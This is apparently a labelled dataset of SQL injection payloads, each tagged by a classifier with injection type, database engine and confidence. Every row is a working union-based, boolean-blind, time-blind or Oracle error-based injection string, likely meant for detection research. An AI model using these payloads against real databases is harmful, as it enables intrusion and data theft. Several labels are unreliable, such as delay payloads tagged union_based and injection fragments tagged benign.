id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
666,"1 ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
668,"-4373'+ ( select 'rlht' where 2285 = 2285 union all select 2285,2285,2285#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
673,"-1891' in boolean mode ) union all select 6680,6680,6680,6680,6680,6680,6680,6680#",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
675,"1"" ) ) as frsd where 6475 = 6475 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 101 chars.,2
678,"1' ) where 3262 = 3262 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 90 chars.,2
679,"-2027%"" ) union all select 2048,2048,2048,2048,2048,2048,2048,2048#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
681,"-3853"" ) where 4626 = 4626 union all select 4626,4626,4626--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
683,-3096' or 3821 = 5539 and 'zrth' = 'zrth,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
685,"1 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
688,"-8349 ) union all select 8126,8126#",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
697,"-7531' ) union all select 3072,3072,3072,3072,3072,3072,3072--",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
698,"1 ) ) ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
707,"1"" ) as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 67 chars.,2
709,"-8490 ) ) union all select 6910,6910,6910,6910,6910,6910#",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
710,"1 ) ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
711,"1"" union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
714,"-6747"" or 9323 = 9323#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
715,-1219' ) or 5592 = 4835,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
716,"1"" ) ) ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
717,"-8566"" ) as hnch where 3418 = 3418 union all select 3418,3418,3418,3418,3418,3418,3418#",union_based,generic,0.7,UNION-based payload detected. Payload length: 87 chars.,2
718,"-2248'+ ( select wuow where 4421 = 4421 union all select 4421,4421,4421,4421,4421,4421--",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
721,"-1438 where 6759 = 6759 union all select 6759,6759#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
729,-1890' ) ) ) or 8526 = 1389 and ( ( ( 'ecgt' = 'ecgt,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
731,"-6388'+ ( select 'jqld' where 8600 = 8600 union all select 8600,8600#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
732,"1"" ) ) and 2006 = 2006",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
737,"1%' ) ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
739,"-6076"" ) ) or 8277 = 4757",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
741,"-6680"" ) ) ) union all select 2564,2564,2564,2564,2564,2564#",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
749,1 ) where 9860 = 9860 and 4443 = 4111--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
751,"1"" ) ) as eglv where 7412 = 7412 union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
754,"1%' union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
757,"-2314%' ) ) union all select 4612,4612--",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
758,1%' and 7533 = 7533 and '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 31 chars.,2
760,"1' ) where 8211 = 8211 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
761,"-1083' ) union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
762,"-6561"" ) ) ) or 6872 = 6872 and ( ( ( ""azqp"" like ""azqp",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,2
766,"-5891 union all select 7103,7103,7103,7103--",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
769,1' ) ) as mbzk where 9153 = 9153 and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
772,-8963 ) where 8528 = 8528 or ( 2470 = 3271 ) *3271--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
775,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
776,"-7267 ) union all select 1912,1912,1912,1912,1912,1912,1912,1912--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
777,"1'+ ( select 'idmr' where 5029 = 5029 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 86 chars.,2
778,"1'+ ( select dklk where 9862 = 9862 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
779,"-4588"" union all select 4550,4550,4550,4550#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
783,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
790,-3088' or 6872 = 6872 and 'miwk' = 'miwk,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
792,"1 ) where 1443 = 1443 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
795,-1036' ) or 6872 = 6872 and ( 'wvbi' = 'wvbi,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
798,"-7884"" where 3297 = 3297 or 2492 = 6158",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
601,"1%' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
628,"1 ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
636,1 ) rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
643,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'tpih' = 'tpih",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
646,"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""menm"" like ""menm",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
647,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'tmdj' like 'tmdj",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
706,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""eefg"" = ""eefg",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
708,"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""lxue"" like ""lxue",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
723,"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""oohx"" like ""oohx",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
733,"1"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
745,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'jjxn' = 'jjxn",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
763,"1 ) ) as kycl where 8008 = 8008 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
768,"1' ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
773,"1"" ) ) as kmss where 3214 = 3214 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
791,"1%"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
796,"1"" ) where 3404 = 3404 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
638,1 ) ) ) and sleep ( 5 ) and ( ( ( 6618 = 6618,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
662,"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
686,"-5230"" ) or elt ( 1032 = 1032,3623 ) and ( ""aivb"" like ""aivb",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
720,1' ) where 7908 = 7908 or sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
750,"1"" ) where 3122 = 3122 and sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
752,1 and sleep ( 5 ) -- ruuv,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
756,"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""ijag"" = ""ijag",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
759,"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
764,"1' ) ) ) and elt ( 9041 = 6421,6421 ) and ( ( ( 'ixxg' like 'ixxg",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
765,"1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
770,"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
780,"-3971%' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( '%' = '",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
785,1' ) ) or sleep ( 5 ) and ( ( 'uzhd' like 'uzhd,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
786,1%' ) ) or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
640,"-6846%"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,1
645,"1' and make_set ( 3445 = 5963,5963 ) and 'wjfw' = 'wjfw",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,1
648,"1 ) and make_set ( 4593 = 7765,7765 ) and ( 8517 = 8517",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,1
658,"-3501"" ) ) ) or ( 6789 = 6990 ) *6990 and ( ( ( ""jnnc"" like ""jnnc",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 65 chars.,1
659,-5026' or ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,1
693,"-3637"" or ( 8459 = 8459 ) *4906",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 31 chars.,1
700,-2981 ) ) or ( 8459 = 8459 ) *4906 and ( ( 4202 = 4202,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1
724,1' ) and ( 1414 = 4775 ) *4775 and ( 'mlmw' = 'mlmw,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,1
787,"1"" ) ) and make_set ( 1167 = 5027,5027 ) and ( ( ""grfi"" = ""grfi",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 63 chars.,1
610,"1"" where 8727 = 8727",benign,generic,0.5,. Payload length: 20 chars.,1
639,1' ) as zxos where 2745 = 2745,benign,generic,0.5,. Payload length: 30 chars.,1
652,1 ) ) as mlpf where 7425 = 7425,benign,generic,0.5,. Payload length: 31 chars.,1
657,"1"" where 7045 = 7045",benign,generic,0.5,. Payload length: 20 chars.,1
665,1' ) where 1363 = 1363,benign,generic,0.5,. Payload length: 22 chars.,1
676,"1"" ) where 9861 = 9861",benign,generic,0.5,. Payload length: 22 chars.,1
680,1 where 3354 = 3354,benign,generic,0.5,. Payload length: 19 chars.,1
692,1 ) where 2232 = 2232,benign,generic,0.5,. Payload length: 21 chars.,1
696,1' ) as bihs where 4197 = 4197,benign,generic,0.5,. Payload length: 30 chars.,1
705,1 ) as oknr where 3228 = 3228,benign,generic,0.5,. Payload length: 29 chars.,1
719,1 ) as mtda where 3951 = 3951,benign,generic,0.5,. Payload length: 29 chars.,1
730,1 ) where 7026 = 7026,benign,generic,0.5,. Payload length: 21 chars.,1
743,1' ) as upgb where 2031 = 2031,benign,generic,0.5,. Payload length: 30 chars.,1
604,"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""twmy"" = ""twmy",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
607,"1'|| ( select 'ersu' where 4123 = 4123 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; UNION-based payload detected; DB: oracle",0
608,"1"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""bxcb"" like ""bxcb",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
612,"1'|| ( select 'jpso' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
613,-6222 ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 3230 = 3230,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
616,"1"" where 4345 = 4345 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
617,"1"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""mrsl"" = ""mrsl",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
620,-8007' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
621,"-8491"" where 6107 = 6107 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
632,"1', ( select ( case when ( 6894 = 6087 ) then 1 else 6894* ( select 6894 from information_schema.character_sets ) end ) )",union_based,mssql,1.0,"Signals: 'char', 'case', 'information_schema'; UNION-based payload detected; DB: mssql",0
637,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual--",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr', 'dual'; UNION-based payload detected; DB: oracle",0
641,"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""mxnj"" like ""mxnj",union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
655,"1, ( select ( case when ( 6750 = 6750 ) then 1 else 6750* ( select 6750 from information_schema.character_sets ) end ) )",union_based,mssql,1.0,"Signals: 'char', 'case', 'information_schema'; UNION-based payload detected; DB: mssql",0
667,"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'wqme' = 'wqme",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
670,"1"" rlike ( select ( case when ( 2724 = 4757 ) then 1 else 0x28 end ) ) and ""cmsa"" = ""cmsa",union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
671,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'lckw' = 'lckw",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr', 'dual'; UNION-based payload detected; DB: oracle",0
